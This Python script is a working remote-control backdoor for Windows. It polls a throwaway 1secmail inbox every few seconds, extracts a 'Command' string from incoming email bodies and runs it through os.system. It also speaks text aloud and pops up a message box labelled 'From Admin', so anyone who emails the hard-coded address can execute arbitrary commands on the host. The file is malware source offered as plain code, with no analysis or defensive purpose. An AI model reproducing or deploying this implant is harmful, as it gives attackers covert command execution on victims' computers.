from distutils.cmd import Command
import requests
import random
import string
import time
import sys
import re
import os
import pyttsx3;
import win32api
from threading import Thread


def recive(code):
    
    API = 'https://www.1secmail.com/api/v1/'
    domainList = ['1secmail.com']
    domain = random.choice(domainList)
    
    def generateUserName():
        name = string.ascii_lowercase + string.digits
        username = ''.join(random.choice(name) for i in range(10))
        return username

    def extract():
        getUserName = re.search(r'login=(.*)&',newMail).group(1)
        getDomain = re.search(r'domain=(.*)', newMail).group(1)
        return [getUserName, getDomain]

    def print_statusline(msg: str): 
        last_msg_length = len(print_statusline.last_msg) if hasattr(print_statusline, 'last_msg') else 0
        sys.stdout.flush()
        print_statusline.last_msg = msg

    def deleteMail():
        url = 'https://www.1secmail.com/mailbox'
        data = {
            'action': 'deleteMailbox',
            'login': f'{extract()[0]}',
            'domain': f'{extract()[1]}'
        }
        req = requests.post(url, data=data)
        
    def run(content,code):
        try:
            try:    
                Com = re.search('Command (.*).', content)
                os.system(Com.group(1))
            except:
                print("K")
            try:
                def spk():
                    Com = re.search('speak (.*).', content)
                    engine = pyttsx3.init();
                    engine.say(Com.group(1));
                    engine.runAndWait() ;
                    
                def alert():
                    Com = re.search('speak (.*).', content)
                    win32api.MessageBox(0, Com.group(1), 'From Admin')

                if __name__ == '__main__':
                    Thread(target = spk).start()
                    Thread(target = alert).start()
                
            except:
                print("kK")

                
        except:
            return
        

    def checkMails():
        reqLink = f'{API}?action=getMessages&login={extract()[0]}&domain={extract()[1]}'
        req = requests.get(reqLink).json()
        length = len(req)
        if length == 0:
            print("Waiting...")
        else:
            print("GET IT....")
            idList = []
            for i in req:
                for k,v in i.items():
                    if k == 'id':
                        mailId = v
                        idList.append(mailId)

            x = 'mails' if length > 1 else 'mail'
            current_directory = os.getcwd()
            final_directory = os.path.join(current_directory, r'All Mails')
            if not os.path.exists(final_directory):
                os.makedirs(final_directory)

            for i in idList:
                msgRead = f'{API}?action=readMessage&login={extract()[0]}&domain={extract()[1]}&id={i}'
                req = requests.get(msgRead).json()
                for k,v in req.items():
                    if k == 'from':
                        sender = v
                    if k == 'subject':
                        subject = v
                    if k == 'date':
                        date = v
                    if k == 'textBody':
                        content = v    
            run(content,code)   
            deleteMail()         
        
    try:

        if True:
            userInput2 = "20014"
            newMail = f"{API}?login={userInput2}&domain={domain}"
            reqMail = requests.get(newMail)
            mail = f"{extract()[0]}@{extract()[1]}"
            while True:
                checkMails()
                time.sleep(3) 


    except(KeyboardInterrupt):
        return

    
 


        

#msg %username% Your message here

recive("1810")


